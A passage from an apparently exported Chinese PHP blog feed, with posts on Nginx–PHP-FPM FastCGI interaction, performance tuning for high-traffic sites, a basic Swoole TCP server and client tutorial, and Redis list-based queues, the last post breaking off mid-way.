<p>更多的同学是知道 PHP-FPM 知道 FastCGI ，但不晓得 Nginx、PHP 这对老搭档具体的交互细节。那么，今天我们就来一起学习一下，做一回认真的 PHP 工程师。</p>
<h2 id="前菜"><a href="#前菜" class="headerlink" title="前菜"></a>前菜</h2><p>为了讲解的有理有据，我们先来准备一个纯净精简的 Nginx+PHP 环境，这里我们使用 Docker 拉取 Centos 最新版本环境，来快速通过编译安装方式搭建一个 Nginx+PHP 环境。</p>
<p>有了 Linux 环境，我们来源码编译安装 Nginx、PHP，这个过程网络里有很多的教程，我们就不细说了。当然你也可以安装 lnmp 一键安装包来快速搭建。通过安装 nginx、php，我们的 Linux 环境里就有了今天的这两位主角了。我们稍加配置，让 Nginx 可以接收请求并转发给 PHP-FPM，我们目标是输出一个 <code>phpinfo()</code> 的信息。</p>
<p>我们通过对 Nginx 新增 Server 配置实现了 nginx 与 PHP 的一次通信，配置文件非常简单。</p>
<p>有了上面的一个 sample 示例，我们开始深入 Nginx 与 FastCGI 协议。</p>
<h2 id="主食"><a href="#主食" class="headerlink" title="主食"></a>主食</h2><p>从上图的 Nginx 配置中可以注意到 fastcgi* 开头的一些配置，以及引入的 <code>fastcgi.conf</code> 文件。其实在 <code>fastcgi.conf</code> 中，也是一堆 fastcgi* 的配置项，只是这些配置项相对不常变，通常单独文件保管可以在多处引用。</p>
<p>可以看到在 <code>fastcgi.conf</code> 中，有很多的 <code>fastcgi_param</code> 配置，结合 nginx server 配置中的 <code>fastcgi_pass</code> <code>fastcgi_index</code> 。通常Nginx 与 PHP 之间打交道就是用的 FastCGI ，但再深问 FastCGI 是什么？它起到衔接 Nginx、PHP 的什么作用？等等深入的问题的时候，很多同学就卡壳了。那么，我们就来一探究竟。</p>
<p>CGI 是通用网关协议，FastCGI 则是一种常住进程的 CGI 模式程序。我们所熟知的 PHP-FPM 的全称是 PHP FastCGI Process Manager，即 PHP-FPM 会通过用户配置来管理一批 FastCGI 进程，例如在 PHP-FPM 管理下的某个 FastCGI 进程挂了，PHP-FPM 会根据用户配置来看是否要重启补全，PHP-FPM 更像是管理器，而真正衔接 Nginx 与 PHP 的则是 FastCGI 进程。</p>
<p>如上图所示，FastCGI 的下游，是 CGI-APP，在我们的 LNMP 架构里，这个 CGI-APP 就是 PHP 程序。而 FastCGI 的上游是 Nginx，他们之间有一个通信载体，即图中的 socket。 <code>fastcgi_pass</code> 所配置的内容，便是告诉 Nginx 你接收到用户请求以后，转发到本机的一个 socket 文件，这里 <code>fastcgi_pass</code> 也常配置为一个 http 接口地址（这个可以在 <code>php-fpm.conf</code> 中配置）。Pre-fork 则对应着我们 PHP-FPM 的启动，也就是在我们启动 PHP-FPM 时便会根据用户配置启动诸多 FastCGI 触发器（FastCGI Wrapper）。</p>
<p>对 FastCGI 在 Nginx+PHP 的模式中的定位有了一定了解后，我们再来了解下 Nginx 中为何能写很多 fastcgi_* 的配置项。这是因为 Nginx 的一个默认内置 module 实现了 FastCGI 的 Client。关于 Module <code>ngx_http_fastcgi_module</code> 的详细文档可以 <span class="exturl" data-url="aHR0cDovL25naW54Lm9yZy9lbi9kb2NzL2h0dHAvbmd4X2h0dHBfZmFzdGNnaV9tb2R1bGUuaHRtbA==">查看这里<i class="fa fa-external-link-alt"></i></span>。</p>
<p><code>fastcgi_param</code> 所声明的内容，将会被传递给 <code>FastCGI server</code>，那这里指的就是 <code>fastcgi_pass</code> 所指向的 server，也就是我们 Nginx+PHP 模式下的 PHP-FPM 所管理的 FastCGI 进程，或者说是那个 socket 文件载体。这时，有的同学会问：“为什么 PHP-FPM 管理的那些 FastCGI 进程要关心这些参数呢？”，好问题，我们一起想想我们做 PHP 应用开发时候有没有用到 $_SERVER 这个全局变量，它里面包含了很多服务器的信息，比如包含了用户的 IP 地址。同学们不想想我们的 PHP 身处 socket 文件之后，为什么能得到远端用户的 IP 呢？ <code>fastcgi_param</code> 配置的 <code>REMOTE_ADDR</code> 这不正是我们在 PHP 中用 $_SERVER[‘REMOTE_ADDR’] 取到的用户 IP 么。的确，Nginx 这个模块里 <code>fastcgi_param</code> 参数，就是考虑后端程序有时需要获取 Webserver 外部的变量以及服务器情况，那么 <code>ngx_http_fastcgi_module</code> 就帮我们做了这件事。真的是太感谢它啦！</p>
<p>那么我们已经说清了 FastCGI 是个什么东东，并且它在 Nginx+PHP 中的定位。我们回到前面提出的问题，“它起到衔接 Nginx、PHP 的什么作用？”。</p>
<p>对 PHP 有一定了解的同学，应该会知道 PHP 提供 SAPI 面向 Webserver 来提供扩展编程。但是这样的方式意味着你要是自主研发一套 Webserver，你就需要学习 SAPI，并且在你的 Webserver 程序中实现它。这意味着你的 Webserver 与 PHP 产生了耦合。在互联网的大趋势下，一般大家都不喜欢看到耦合。譬如 Nginx 在最初研发时候也不是为了和 PHP 组成黄金搭档而研发的，相信早些年的 Nginx 后端程序可能是其他语言开发。那么解决耦合的办法，比较好的方式是有一套通用的规范，上下游都兼容它。那么 CGI 协议便成了 Nginx、PHP 都愿意接受的一种方式，而 FastCGI 常住进程的模式又让上下游程序有了高并发的可能。那么 FastCGI 的作用是 Nginx、PHP 的接口载体，就像插座与插销，让流行的 WebServer 与 “世界上最好的语言” 有了合作的可能。</p>
<p>有了这些基础背景知识与他们的缘由，我们就可以举一反三的做更多有意思的事情。譬如我在前年曾实现了 Java 程序中按照 FastCGI Client 的方式（替代 Nginx）与 PHP-FPM 通信，实现 Java 项目 + PHP 的一种组合搭配，解决的问题是 Java 程序一般来说在代码调整后需要编译过程，而 PHP 可以随时调整代码随时生效，那么让 Java 作为项目外壳，一些易变的代码由 PHP 实现，在需要的时候 Java 程序通过 FastCGI 与 PHP 打交道就好。这套想法也是基于对 Nginx+PHP 交互模式的理解之上想到的。</p>
<p>网络中也有一些借助 FastCGI 的尝试与实践，譬如<span class="exturl" data-url="aHR0cDovL2Nocmlzd3UubWUvYmxvZy93cml0aW5nLWhlbGxvLXdvcmxkLWluLWZjZ2ktd2l0aC1jLXBsdXMtcGx1cy8=">《Writing Hello World in FCGI with C++》<i class="fa fa-external-link-alt"></i></span>这篇文章，用 C++ 实现一个 FastCGI 的程序，外部依然是某款 Webserver 来处理 HTTP 请求，但具体功能则有 C++ 来实现，他们的中间交互同样适用的 FastCGI。同学们有兴趣了也可以做些 Geek 尝试。</p>
<h2 id="甜品"><a href="#甜品" class="headerlink" title="甜品"></a>甜品</h2><p>通过本文的讲解，我们希望让大家看到，Nginx+PHP 的工程模式下，两位主角分工明确，Nginx 负责承载 HTTP 请求的响应与返回，以及超时控制记录日志等 HTTP 相关的功能，而 PHP 则负责处理具体请求要做的业务逻辑，它们俩的这种合作模式也是常见的分层架构设计中的一种，在它们各有专注面的同时，FastCGI 又很好的将两块衔接，保障上下游通信交互，这种通过某种协议或规范来衔接好上下游的模式，在我们日常的 PHP 应用开发中也有这样的思想落地，譬如我们所开发的高性能 API，具体的 Client 到底是 PC、APP 还是某个其他程序，我们不关心，而这些 PC、APP、第三方程序也不关心我们的 PHP 代码实现，他们按照 API 的规范来请求做处理即可。</p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
  </entry>
  <entry>
    <title>PHP 解决网站大数据大流量与高并发</title>
    <url>/2018/03/php-performance/</url>
    <content><![CDATA[<h2 id="第一，硬件方面"><a href="#第一，硬件方面" class="headerlink" title="第一，硬件方面"></a>第一，硬件方面</h2><p>普通的一个 p4 的服务器每天最多能支持大约 10 万左右的 IP，如果访问量超过 10W 那么需要专用的服务器才能解决，如果硬件不给力 软件怎么优化都是于事无补的。</p>
<p>主要影响服务器的速度</p>
<span id="more"></span>

<p>有：网络 - 硬盘读写速度 - 内存大小 - cpu 处理速度。</p>
<h2 id="第二，软件方面"><a href="#第二，软件方面" class="headerlink" title="第二，软件方面"></a>第二，软件方面</h2><ol>
<li>数据库优化，首先要有一个很好的架构，查询尽量不用 * 避免相关子查询 给经常查询的添加索引用排序来取代非顺序存取，如果条件允许，一般 MySQL 服务器最好安装</li>
</ol>
<p>在 Linux 操作系统中 。关于 apache 和 nginx 在高并发的情况下推荐使用 nginx，ginx 是 Apache 服务器不错的替代品。nginx 内存消耗少 官方测试能够支撑 5 万并发连接，在实际生产环境中跑</p>
<p>到 2～3 万并发连接数。php 方面不需要的模块尽量关闭，使用 memcached，Memcached 是一个高性能的分布式内存对象缓存系统，不使用数据库直接从内存当中调数据，这样大大提升了速度，iiS 或 Apache 启用 GZIP 压缩优化网站，压缩网站内容大大节省网站流量。</p>
<ol start="2">
<li>禁止外部的盗链。</li>
</ol>
<p>外部网站的图片或者文件盗链往往会带来大量的负载压力，因此应该严格限制外部对于自身的图片或者文件盗链，好在目前可以简单地通过 refer 来控制盗链，Apache 自己就可以通过配置来禁止盗链，IIS 也有一些第三方的 ISAPI 可以实现同样的功能。</p>
<p>当然，伪造 refer 也可以通过代码来实现盗链，不过目前蓄意伪造 refer 盗链的还不多，可以先不去考虑，或者使用非技术手段来解决，比如在图片上增加水印。</p>
<h2 id="第三，控制大文件的下载。"><a href="#第三，控制大文件的下载。" class="headerlink" title="第三，控制大文件的下载。"></a>第三，控制大文件的下载。</h2><p>大文件的下载会占用很大的流量，并且对于非 SCSI 硬盘来说，大量文件下载会消耗 CPU，使得网站响应能力下降。</p>
<p>因此，尽量不要提供超过 2M 的大文件下载，如果需要提供，建议将大文件放在另外一台服务器上。</p>
<h2 id="第四，使用不同主机分流主要流量"><a href="#第四，使用不同主机分流主要流量" class="headerlink" title="第四，使用不同主机分流主要流量"></a>第四，使用不同主机分流主要流量</h2><p>将文件放在不同的主机上，提供不同的镜像供用户下载。比如如果觉得 RSS 文件占用流量大，那么使用 FeedBurner 或者 FeedSky 等服务将 RSS 输出放在其他主机上。</p>
<p>这样别人访问的流量压力就大多集中在 FeedBurner 的主机上，RSS 就不占用太多资源了</p>
<h2 id="第五，使用不同主机分流主要流量"><a href="#第五，使用不同主机分流主要流量" class="headerlink" title="第五，使用不同主机分流主要流量"></a>第五，使用不同主机分流主要流量</h2><p>将文件放在不同的主机上，提供不同的镜像供用户下载。比如如果觉得 RSS 文件占用流量大，那么使用 FeedBurner 或者 FeedSky 等服务将 RSS 输出放在其他主机上。</p>
<p>这样别人访问的流量压力就大多集中在 FeedBurner 的主机上，RSS 就不占用太多资源了。</p>
<h2 id="第六，使用流量分析统计软件。"><a href="#第六，使用流量分析统计软件。" class="headerlink" title="第六，使用流量分析统计软件。"></a>第六，使用流量分析统计软件。</h2><p>在网站上安装一个流量分析统计软件，可以即时知道哪些地方耗费了大量流量，哪些页面需要再进行优化，因此，解决流量问题还需要进行精确的统计分析才可以。比如：Google Analytics（Google 分析）。</p>
<p>高并发和高负载的约束条件：硬件、部署、操作系统、Web 服务器、PHP、MySQL、测试</p>
<p>部署：服务器分离、数据库集群和库表散列、镜像、负载均衡</p>
<p>负载均衡分类： 1)、DNS 轮循 2）代理服务器负载均衡 3）地址转换网关负载均衡 4）NAT 负载均衡 5）反向代理负载均衡 6）混合型负载均衡</p>
<h2 id="部署方案-1："><a href="#部署方案-1：" class="headerlink" title="部署方案 1："></a>部署方案 1：</h2><p>适用范围：静态内容为主体的网站和应用系统；对系统安全要求较高的网站和应用系统。</p>
<p>Main Server：主服务器</p>
<pre><code>承载程序的主体运行压力，处理网站或应用系统中的动态请求；

将静态页面推送至多个发布服务器；

将附件文件推送至文件服务器；

安全要求较高，以静态为主的网站，可将服务器置于内网屏蔽外网的访问。
</code></pre>
<p>DB Server：数据库服务器</p>
<pre><code>承载数据库读写压力；

只与主服务器进行数据量交换，屏蔽外网访问。

File/Video Server：文件 / 视频服务器

承载系统中占用系统资源和带宽资源较大的数据流；

作为大附件的存储和读写仓库；

作为视频服务器将具备视频自动处理能力。
</code></pre>
<p>发布服务器组：</p>
<pre><code>只负责静态页面的发布，承载绝大多数的 Web 请求；

通过 Nginx 进行负载均衡部署。
</code></pre>
<h2 id="部署方案-2："><a href="#部署方案-2：" class="headerlink" title="部署方案 2："></a>部署方案 2：</h2><p>适用范围：以动态交互内容为主体的网站或应用系统；负载压力较大，且预算比较充足的网站或应用系统；</p>
<p>Web 服务器组：</p>
<pre><code>Web 服务无主从关系，属平行冗余设计；

通过前端负载均衡设备或 Nginx 反向代理实现负载均衡；

划分专用文件服务器 / 视频服务器有效分离轻 / 重总线；

每台 Web 服务器可通过 DEC 可实现连接所有数据库，同时划分主从。
</code></pre>
<p>数据库服务器组：</p>
<pre><code>相对均衡的承载数据库读写压力；

通过数据库物理文件的映射实现多数据库的数据同步。

共享磁盘 / 磁盘阵列

将用于数据物理文件的统一读写

用于大型附件的存储仓库

通过自身物理磁盘的均衡和冗余，确保整体系统的 IO 效率和数据安全；
</code></pre>
<p>方案特性：</p>
<pre><code>通过前端负载均衡，合理分配 Web 压力；

通过文件 / 视频服务器与常规 Web 服务器的分离，合理分配轻重数据流；

通过数据库服务器组，合理分配数据库 IO 压力；

每台 Web 服务器通常只连接一台数据库服务器，通过 DEC 的心跳检测，可在极短时间内自动切换至冗余数据库服务器；

磁盘阵列的引入，大幅提升系统 IO 效率的同时，极大增强了数据安全性。
</code></pre>
<p>Web 服务器：</p>
<pre><code>Web 服务器很大一部分资源占用来自于处理 Web 请求，通常情况下这也就是 Apache 产生的压力，在高并发连接的情况下，Nginx 是 Apache 服务器不错的替代品。Nginx (“engine x”) 是俄罗斯人编写的一款高性能的 HTTP 和反向代理服务器。在国内，已经有新浪、搜狐通行证、网易新闻、网易博客、金山逍遥网、金山爱词霸、校内网、YUPOO 相册、豆瓣、迅雷看看等多家网站、 频道使用 Nginx 服务器。
</code></pre>
<h2 id="Nginx-的优势："><a href="#Nginx-的优势：" class="headerlink" title="Nginx 的优势："></a>Nginx 的优势：</h2><p>高并发连接：官方测试能够支撑 5 万并发连接，在实际生产环境中跑到 2～3 万并发连接数。</p>
<p>内存消耗少：在 3 万并发连接下，开启的 10 个 Nginx 进程才消耗 150M 内存（15M*10&#x3D;150M）。</p>
<p>内置的健康检查功能：如果 Nginx Proxy 后端的某台 Web 服务器宕机了，不会影响前端访问。</p>
<p>策略：相对于老牌的 Apache，我们选择 Lighttpd 和 Nginx 这些具有更小的资源占用率和更高的负载能力的 web 服务器。</p>
<h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><p>MySQL 本身具备了很强的负载能力，MySQL 优化是一项很复杂的工作，因为这最终需要对系统优化的很好理解。大家都知道数据库工作就是大量的、 短时的查询和读写，除了程序开发时需要注意建立索引、提高查询效率等软件开发技巧之外，从硬件设施的角度影响 MySQL 执行效率最主要来自于磁盘搜索、磁盘 IO 水平、CPU 周期、内存带宽。</p>
<p>根据服务器上的硬件和软件条件进行 MySQl 优化。MySQL 优化的核心在于系统资源的分配，这不等于无限制的给 MySQL 分配更多的资源。在 MySQL 配置文件中我们介绍几个最值得关注的参数：</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">改变索引缓冲区长度 <span class="comment">(key_buffer)</span></span><br><span class="line"></span><br><span class="line">改变表长 <span class="comment">(read_buffer_size)</span></span><br><span class="line"></span><br><span class="line">设定打开表的数目的最大值 <span class="comment">(table_cache)</span></span><br><span class="line"></span><br><span class="line">对缓长查询设定一个时间限制 <span class="comment">(long_query_time)</span></span><br></pre></td></tr></table></figure>

<p>如果条件允许 ，一般 MySQL 服务器最好安装在 Linux 操作系统中，而不是安装在 FreeBSD 中。<br>策略： MySQL 优化需要根据业务系统的数据库读写特性和服务器硬件配置，制定不同的优化方案，并且可以根据需要部署 MySQL 的主从结构。</p>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>1、加载尽可能少的模块；</p>
<p>2、如果是在 windows 平台下，尽可能使用 IIS 或者 Nginx 来替代我们平常用的 Apache；</p>
<p>3、安装加速器（都是通过缓存 php 代码预编译的结果和数据库结果来提高 php 代码的执行速度）<br>eAccelerator，eAccelerator 是一个自由开放源码 php 加速器，优化和动态内容缓存，提高了性能 php 脚本的缓存性能，使得 PHP 脚本在编译的状态下，对服务器的开销几乎完全消除。</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">Apc：Alternative PHP Cache（APC）是 PHP 的一个免费公开的优化代码缓存。它用来提供免费，公开并且强健的架构来缓存和优化 PHP 的中间代码。</span><br><span class="line"></span><br><span class="line">memcache：memcache 是由 Danga Interactive 开发的，高性能的，分布式的内存对象缓存系统，用于在动态应用中减少数据库负载，提升访问速度。主要机制是通过在内存里维护一个统 一的巨大的 <span class="built_in">hash</span> 表，Memcache 能够用来存储各种格式的数据，包括图像、视频、文件以及数据库检索的结果等</span><br><span class="line"></span><br><span class="line">Xcache：国人开发的缓存器，</span><br></pre></td></tr></table></figure>

<p>策略： 为 PHP 安装加速器。</p>
<p>代理服务器（缓存服务器）：</p>
<p>Squid Cache（简称为 Squid）是一个流行的自由软件（GNU 通用公共许可证）的代理服务器和 Web 缓存服务器。Squid 有广泛的用途，从作为网页服务器的前置 cache 服务器缓存相关请求来提高 Web 服务器的速度，到为一组人共享网络资源而缓存万维网，域名系统和其他网络搜索，到通过过滤流量帮助网络安全，到局域网通过代理网。Squid 主要设计用于在 Unix 一类系统运行。</p>
<p>策略：安装 Squid 反向代理服务器，能够大幅度提高服务器效率。</p>
<p>压力测试：压力测试是一种基本的质量保证行为，它是每个重要软件测试工作的一部分。压力测试的基本思路很简单：不是在常规条件下运行手动或自动测试，而是在计算机数量较少或系统资源匮乏的条件下运行测试。通常要进行压力测试的资源包括内部内存、CPU 可用性、磁盘空间和网络带宽等。一般用并发来做压力测试。<br>压力测试工具：webbench，ApacheBench 等</p>
<p>漏洞测试：在我们的系统中漏洞主要包括：sql 注入漏洞，xss 跨站脚本攻击等。安全方面还包括系统软件，如操作系统漏洞，mysql、apache 等的漏洞，一般可以通过升级来解决。</p>
<p>漏洞测试工具：Acunetix Web Vulnerability Scanner</p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
  </entry>
  <entry>
    <title>学习 Swoole 的心得</title>
    <url>/2018/03/php-swoole/</url>
    <content><![CDATA[<h2 id="什么是-swoole"><a href="#什么是-swoole" class="headerlink" title="什么是 swoole"></a>什么是 swoole</h2><p>swoole 是 PHP 的异步、并行、高性能网络通信引擎，使用纯 C 语言编写，提供了 PHP 语言的异步多线程服务器，异步 TCP&#x2F;UDP 网络客户端，异步 MySQL，异步 Redis，数据库连接池，AsyncTask，消息队列，毫秒定时器，异步文件读写，异步 DNS 查询。 Swoole 内置了 Http&#x2F;WebSocket 服务器端 &#x2F; 客户端、Http2.0 服务器端。</p>
<span id="more"></span>

<p>Swoole 可以广泛应用于互联网、移动通信、企业软件、云计算、网络游戏、物联网（IOT）、车联网、智能家居等领域。 使用 PHP+Swoole 作为网络通信框架，可以使企业 IT 研发团队的效率大大提升，更加专注于开发创新产品。随着我们</p>
<h2 id="我们为什么用-swoole"><a href="#我们为什么用-swoole" class="headerlink" title="我们为什么用 swoole"></a>我们为什么用 swoole</h2><p>用户打开了我们的网站。他要做的就是勾选需要发邮件的代理商列表，然后把结算邮件发出去。</p>
<p>假如我们需要发 1 封邮件，我们写个函数执行即可。考虑到网络可能会稍微有点延迟，但是是可以接受的，用户会乖乖等你的网页发完邮件了再关闭网页。</p>
<p>假如我们要发布 10 封邮件，用一个 for 循环，循环 10 遍执行发邮件操作。这时候，也许 10 倍的网络延迟会让用户稍微有点不耐烦，但勉强可以等吧。</p>
<p>假如要发 100 封邮件，for 循环 100 遍，用户直接揭竿而起，什么破网站！</p>
<p>但实际上，我们很可能有超过 1 万的邮件。怎么处理这个延迟的问题？</p>
<p>答案就是用异步。把 “发邮件” 这个操作封装，然后后台异步地执行 1 万遍。这样的话，用户提交网页后，他所等待的时间只是 “把发邮件任务请求推送进队列里” 的时间。而我们的后台服务将在用户看不见的地方跑。而 swoole 就为我们实现了异步队列处理及并发等问题。</p>
<h2 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h2><h4 id="1-安装-swoole"><a href="#1-安装-swoole" class="headerlink" title="1. 安装 swoole"></a>1. 安装 swoole</h4><p>有两种安装方式，一种是先下载安装包，传到服务器（记住一定是 linux 服务器）上，然后解压，然后先 cd 到服务器的安装包的位置，然后执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">phpize</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./configure</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make</span> </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo make install</span></span><br></pre></td></tr></table></figure>

<p>系统就会自动安装，如果提示 phpize 不存在的话，就需要安装一下 phpize。</p>
<p>另一种方式直接执行</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">$ pecl <span class="keyword">install</span> swoole</span><br></pre></td></tr></table></figure>

<p>用这种方式可以自动下载安装。我采取的是第二种方式噢。</p>
<p>安装完成，需要更改 php.ini 的配置，将</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">extension</span><span class="operator">=</span>swoole.so</span><br></pre></td></tr></table></figure>
<p>放在这个配置中，然后重启 nginx。</p>
<p>完成以后执行</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>php -m</span><br></pre></td></tr></table></figure>

<p>查看是否有 swoole。有 swoole 说明安装成功。</p>
<h4 id="2-启动-server"><a href="#2-启动-server" class="headerlink" title="2. 启动 server"></a>2. 启动 server</h4><p>之前看文档我一直以为 swoole 是个框架，需要我们配置然后设置端口访问，其实不是，swoole 是 php 的扩展，我们只需要在我们的项目中增加 server.php, 或者其他的名字，里面的代码简单点可以按照文档上来写，如下：</p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建Server对象，监听 127.0.0.1:9501端口</span></span><br><span class="line"><span class="variable">$serv</span> = <span class="keyword">new</span> <span class="type">swoole_server</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">9501</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">//监听连接进入事件</span></span><br><span class="line"><span class="variable">$serv</span>-&gt;on(<span class="string">&#x27;connect&#x27;</span>, <span class="title function_"><span class="keyword">function</span> </span>(<span class="variable">$serv</span>, <span class="variable">$fd</span>) &#123;  </span><br><span class="line">    echo <span class="string">&quot;Client: Connect.\n&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//监听数据发送事件</span></span><br><span class="line"><span class="variable">$serv</span>-&gt;on(<span class="string">&#x27;receive&#x27;</span>, <span class="title function_"><span class="keyword">function</span> </span>(<span class="variable">$serv</span>, <span class="variable">$fd</span>, <span class="variable">$from_id</span>, <span class="variable">$data</span>) &#123;</span><br><span class="line">    <span class="variable">$serv</span>-&gt;send(<span class="variable">$fd</span>, <span class="string">&quot;Server: &quot;</span>.<span class="variable">$data</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//监听连接关闭事件</span></span><br><span class="line"><span class="variable">$serv</span>-&gt;on(<span class="string">&#x27;close&#x27;</span>, <span class="title function_"><span class="keyword">function</span> </span>(<span class="variable">$serv</span>, <span class="variable">$fd</span>) &#123;</span><br><span class="line">    echo <span class="string">&quot;Client: Close.\n&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//启动服务器</span></span><br><span class="line"><span class="variable">$serv</span>-&gt;start(); </span><br></pre></td></tr></table></figure>

<p>这里就创建了一个 TCP 服务器，监听本机 9501 端口，你也可以改成其他的端口号，只要你的服务器可以支持这个端口。</p>
<p>服务器端的 server 必须运行起来我们才能使用 swoole，异步执行。如何运行呢？我们 cd 到你的项目下 server.php 所在的文件夹，然后执行</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line">$ php <span class="keyword">server</span>.php</span><br></pre></td></tr></table></figure>

<p>如何测试成功呢？我们可以关掉这个客户端，重新打开连接服务器，然后执行</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">$</span> <span class="string">telnet</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">9501</span></span><br><span class="line"><span class="string">hello</span></span><br><span class="line"><span class="attr">Server:</span> <span class="string">hello</span></span><br></pre></td></tr></table></figure>

<p>如果是这样子说明成功了。</p>
<p>需要注意的是我们如果修改了 server.php, 必须断掉之前，然后重新打开。</p>
<p>我这边写了一个脚本来断掉之前的，起名 stop.sh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line">ps -eaf |grep <span class="string">&quot;server.php&quot;</span> | grep -v <span class="string">&quot;grep&quot;</span>| awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|xargs <span class="built_in">kill</span> -9</span><br></pre></td></tr></table></figure>

<p>这需要放在和 <code>server.php</code> 同一个文件夹。</p>
<p>我们需要 cd 到这个文件夹，执行 <code>sh stop.sh</code></p>
<h2 id="3-client"><a href="#3-client" class="headerlink" title="3. client"></a>3. client</h2><p>这个是可以在浏览器上执行的，我们见一个 <code>client.php</code>，代码如下：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">$client = new swoole_client(SWOOLE_SOCK_TCP);</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>连接到服务器</span><br><span class="line"><span class="keyword">if</span> (!$client-&gt;<span class="keyword">connect</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9501</span>, <span class="number">0</span>.<span class="number">5</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;connect failed.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">//向服务器发送数据</span><br><span class="line"><span class="keyword">if</span> (!$client-&gt;<span class="keyword">send</span>(<span class="string">&quot;hello world&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;send failed.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">//从服务器接收数据</span><br><span class="line">$data = $client-&gt;<span class="keyword">recv</span>();</span><br><span class="line"><span class="keyword">if</span> (!$data)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;recv failed.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">echo $data;</span><br><span class="line"><span class="regexp">//</span>关闭连接</span><br><span class="line">$client-&gt;<span class="keyword">close</span>();</span><br></pre></td></tr></table></figure>

<p>创建一个 TCP 的同步客户端，此客户端可以用于连接到我们 server 服务器。向服务器端发送一个 hello world 字符串，服务器会返回一个 <code>Server: hello world</code> 字符串。</p>
<p>以上是 swoole 简单的安装和连同。</p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>Swoole</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis 队列功能</title>
    <url>/2018/03/redis-queue/</url>
    <content><![CDATA[<h2 id="List-常用命令"><a href="#List-常用命令" class="headerlink" title="List 常用命令"></a>List 常用命令</h2><p>Blpop 删除，并获得该列表中的第一元素，或阻塞，直到有一个可用</p>
<span id="more"></span>

<p>Brpop 删除，并获得该列表中的最后一个元素，或阻塞，直到有一个可用</p>
<p>Brpoplpush</p>
<p>Lindex 获取一个元素，通过其索引列表</p>
<p>Linsert 在列表中的另一个元素之前或之后插入一个元素</p>
<p>Llen 获得队列 (List) 的长度</p>
<p>Lpop 从队列的左边出队一个元素</p>
<p>Lpush 从队列的左边入队一个或多个元素</p>
<p>Lpushx 当队列存在时，从队到左边入队一个元素</p>
<p>Lrange 从列表中获取指定返回的元素</p>
<p>Lrem 从列表中删除元素</p>
<p>Lset 设置队列里面一个元素的值</p>
<p>Ltrim 修剪到指定范围内的清单</p>
<p>Rpop 从队列的右边出队一个元素</p>
<p>Rpoplpush 删除列表中的最后一个元素，将其追加到另一个列表</p>
<p>Rpush 从队列的右边入队一个元素</p>
<p>Rpushx 从队列的右边入队一个元素，仅队列存在时有效</p>
<p>Redis 支持 php、python、c 等接口</p>
<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>Redis list 的应用场景非常多，也是 Redis 最重要的数据结构之一，比如 twitter 的关注列表，粉丝列表等都可以用 Redis 的 list 结构来实现。</p>
<p>Lists 就是链表，相信略有数据结构知识的人都应该能理解其结构。使用 Lists 结构，我们可以轻松地实现最新消息排行等功能。</p>
<p>Lists 的另一个应用就是消息队列，</p>
<p>可以利用 Lists 的 PUSH 操作，将任务存在 Lists 中，然后工作线程再用 POP 操作将任务取出进行执行。Redis 还提供了操作 Lists 中某一段的 api，你可以直接查询，删除 Lists 中某一段的元素。 </p>
<p>如果需要还可以用 redis 的 Sorted-Sets 数据结构来做优先队列。可以给每条消息加上一个唯一的序号。这里就不详细介绍了。</p>
<h2 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h2><p>Redis list 的实现为一个双向链表，即可以支持反向查找和遍历，更方便操作，不过带来了部分额外的内存开销，Redis 内部的很多实现，包括发送缓冲队列等也都是用的这个数据结构。</p>
<h2 id="1-入队"><a href="#1-入队" class="headerlink" title="1) 入队"></a>1) 入队</h2><p>入队操作命令</p>
